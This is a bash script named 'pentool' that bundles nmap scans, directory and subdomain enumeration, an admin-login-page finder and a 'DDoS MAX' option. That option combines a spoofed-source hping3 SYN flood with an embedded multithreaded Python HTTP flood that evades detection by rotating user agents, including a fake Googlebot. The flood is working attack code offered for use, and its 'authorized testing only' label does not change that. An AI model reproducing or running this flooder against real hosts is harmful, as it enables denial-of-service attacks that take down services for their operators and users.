#!/bin/bash
# pentool - Penetration Testing Toolkit
# Nmap | DDoS MAX | Hidden Files | Subdomains | Admin Panel Finder

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

banner() {
    echo -e "${RED}"
    cat << "EOF"
  ██████╗ ███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗
  ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║
  ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║
  ██║     ███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝██║
  ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝
EOF
    echo -e "${NC}${CYAN}        Penetration Testing Toolkit | Authorized Testing Only${NC}"
    echo ""
}

menu() {
    echo -e "${YELLOW}[1]${NC} Nmap - Quick Port Scan"
    echo -e "${YELLOW}[2]${NC} Nmap - Full Scan (all ports, service & OS detection)"
    echo -e "${YELLOW}[3]${NC} Nmap - Aggressive Scan (-A) + Vulnerability Scripts"
    echo -e "${YELLOW}[4]${NC} DDoS Stress Test (MAX POWER)"
    echo -e "${YELLOW}[5]${NC} Hidden Files & Directories Scanner"
    echo -e "${YELLOW}[6]${NC} Subdomain Enumerator"
    echo -e "${YELLOW}[7]${NC} Admin Panel Finder"
    echo -e "${YELLOW}[8]${NC} Exit"
    echo ""
    read -p "pentool >> select option: " opt
}

check_target() {
    if [ -z "$1" ]; then
        echo -e "${RED}[!] Please enter a target${NC}"
        exit 1
    fi
}

# ================= NMAP =================
nmap_quick() {
    read -p "Target (IP/domain): " target; check_target "$target"
    echo -e "${GREEN}[*] Quick scan starting...${NC}"
    nmap -T4 -F --top-ports 1000 -sV "$target"
}

nmap_full() {
    read -p "Target (IP/domain): " target; check_target "$target"
    echo -e "${GREEN}[*] Full scan starting (this may take a while)...${NC}"
    nmap -p- -T4 -sV -O "$target" -oN nmap_full_"$target".txt
    echo -e "${CYAN}[+] Results saved: nmap_full_$target.txt${NC}"
}

nmap_aggressive() {
    read -p "Target (IP/domain): " target; check_target "$target"
    echo -e "${GREEN}[*] Aggressive + vulnerability scan...${NC}"
    nmap -A -T4 --script vuln "$target" -oN nmap_vuln_"$target".txt
    echo -e "${CYAN}[+] Results saved: nmap_vuln_$target.txt${NC}"
}

# ================= DDoS MAX =================
ddos_max() {
    read -p "Target URL/IP: " target; check_target "$target"
    read -p "Port (default 80): " port; port=${port:-80}
    read -p "Threads (default 2000): " thr; thr=${thr:-2000}
    echo -e "${YELLOW}[!] Use ONLY on your own authorized assets!${NC}"
    echo -e "${GREEN}[*] MAX POWER flood starting... Ctrl+C to stop.${NC}"

    if command -v hping3 >/dev/null 2>&1 && [ "$EUID" -eq 0 ]; then
        echo -e "${CYAN}[*] Launching hping3 SYN flood in background...${NC}"
        hping3 -S --flood -V -p "$port" --rand-source "$target" --data 120 2>/dev/null &
        HPING_PID=$!
    else
        echo -e "${YELLOW}[!] hping3 needs root. Run: sudo pentool${NC}"
    fi

    python3 - "$target" "$port" "$thr" << 'PYEOF'
import sys, socket, threading, random, time, ssl

target, port, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
sent = [0]
lock = threading.Lock()
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

def http_flood():
    payload_tpl = (
        "GET /?{r} HTTP/1.1\r\n"
        "Host: {t}\r\n"
        "User-Agent: {ua}\r\n"
        "Accept: text/html,application/xhtml+xml,*/*\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: no-cache\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            if port == 443:
                ctx = ssl._create_unverified_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            payload = payload_tpl.format(r=random.randint(0,10**9), t=target, ua=random.choice(UA_LIST)).encode()
            while True:
                s.send(payload)
                s.send(b"X-a: " + str(random.randint(1,9999)).encode() + b"\r\n")
                time.sleep(0.05)
                with lock: sent[0] += 1
        except Exception:
            try: s.close()
            except: pass

def reporter():
    while True:
        time.sleep(2)
        with lock:
            print(f"[+] Requests sent: {sent[0]}")

threading.Thread(target=reporter, daemon=True).start()
for _ in range(threads):
    threading.Thread(target=http_flood, daemon=True).start()
try:
    while True: time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopped.")
PYEOF

    if [ -n "$HPING_PID" ]; then
        echo -e "${YELLOW}[*] Killing hping3 (PID $HPING_PID)...${NC}"
        kill "$HPING_PID" 2>/dev/null
    fi
}

# ================= Hidden Files =================
dir_scan() {
    read -p "Target URL: " target; check_target "$target"
    echo -e "${GREEN}[*] Directory fuzzing starting...${NC}"
    if command -v dirsearch >/dev/null 2>&1; then
        dirsearch -u "http://$target" -e php,html,txt,backup,json,env,git,sql,bak,old -t 30
    elif command -v gobuster >/dev/null 2>&1; then
        gobuster dir -u "http://$target" -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,env,bak,git
    else
        dirb "http://$target" /usr/share/wordlists/dirb/common.txt
    fi
}

# ================= Subdomain =================
sub_scan() {
    read -p "Domain: " target; check_target "$target"
    echo -e "${GREEN}[*] Enumerating subdomains...${NC}"
    if command -v assetfinder >/dev/null 2>&1; then
        assetfinder "$target" | tee subdomains_"$target".txt
    elif command -v amass >/dev/null 2>&1; then
        amass enum -passive -d "$target" | tee subdomains_"$target".txt
    else
        echo -e "${YELLOW}[*] Falling back to gobuster DNS mode...${NC}"
        gobuster dns -d "$target" -w /usr/share/wordlists/dirb/common.txt
    fi
    echo -e "${CYAN}[+] Results saved: subdomains_$target.txt${NC}"
}

# ================= Admin Panel Finder =================
admin_finder() {
    read -p "Target URL (example.com): " target; check_target "$target"
    cat > /tmp/admin_paths.txt << 'EOF'
/admin
/admin/
/admin/login
/admin/login.php
/admin/index.php
/adminpanel
/administrator
/administrator/login
/administrator/index.php
/admincp
/admin_area
/adminarea
/controlpanel
/cpanel
/dashboard
/login
/login.php
/manage
/management
/manager
/panel
/siteadmin
/wp-admin
/wp-admin/
/wp-login.php
/cms/admin
/adm
/adm/index.php
/adm/login.php
/acp
/backend
/backoffice
/signin
/sign-in
/auth
/auth/login
/adminLogin
/admin_login
/adminlogin
/webadmin
/web-admin
/phpMyAdmin
/phpmyadmin
/pma
/myadmin
/sqladmin
/account/login
/staff
/staff/login
/internal/login
/admin/config
/admin/dashboard
/admin/main
/.admin
/hidden-admin
/secret-admin
/admin.html
/admin.php
/admin/admin.php
/admin/account.php
/admin/login.html
/admin/controlpanel
/administrator.php
/administrator/login.php
EOF

    echo -e "${GREEN}[*] Scanning for admin panels...${NC}"
    while IFS= read -r path; do
        url="http://$target$path"
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 -L "$url")
        if [[ "$code" =~ ^(200|301|302|401|403)$ ]]; then
            content=$(curl -sk --max-time 5 -L "$url" | head -c 5000)
            if echo "$content" | grep -qiE 'password|login|admin|username|sign.?in|<form'; then
                echo -e "${GREEN}[+] FOUND (login panel): $url [HTTP $code]${NC}"
            else
                echo -e "${YELLOW}[?] Possible: $url [HTTP $code]${NC}"
            fi
        fi
    done < /tmp/admin_paths.txt
    echo -e "${CYAN}[+] Scan complete.${NC}"
}

# ================= MAIN =================
banner
while true; do
    menu
    case $opt in
        1) nmap_quick ;;
        2) nmap_full ;;
        3) nmap_aggressive ;;
        4) ddos_max ;;
        5) dir_scan ;;
        6) sub_scan ;;
        7) admin_finder ;;
        8) echo -e "${GREEN}Exiting pentool. Good luck!${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
    echo ""
    read -p "Press Enter to continue..."
    banner
done
